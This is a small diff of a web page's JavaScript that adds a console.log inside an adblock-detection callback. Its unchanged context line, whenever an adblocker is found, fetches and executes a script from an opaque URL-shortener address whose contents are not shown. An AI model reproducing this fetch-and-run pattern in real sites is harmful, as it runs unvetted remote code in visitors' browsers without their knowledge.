@@ -92,7 +92,7 @@ $.getScript( "https://cdn.jsdelivr.net/npm/just-detect-adblock@1.1.0/dist/bundle
     justDetectAdblock.detectAnyAdblocker().then(function(detected) {
     if(detected){
       // an adblocker is detected
-        
+        console.log(detected);
         $.getScript( "https://teenurl.in/kss45",(data)=>{});
     }
   });
